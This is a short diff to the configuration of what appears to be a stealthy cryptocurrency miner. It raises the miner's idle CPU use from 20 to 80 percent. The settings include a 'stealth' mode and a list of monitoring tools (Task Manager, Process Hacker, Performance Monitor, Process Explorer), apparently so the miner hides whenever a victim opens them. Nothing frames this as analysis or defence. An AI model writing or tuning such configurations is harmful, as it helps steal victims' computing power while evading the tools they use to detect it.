@@ -9,7 +9,7 @@
 	"nicehash": false,
 	"ssltls": true,
 	"idle-wait": 5,
-	"idle-cpu": 20,
+	"idle-cpu": 80,
 	"stealth": true,
 	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
 }
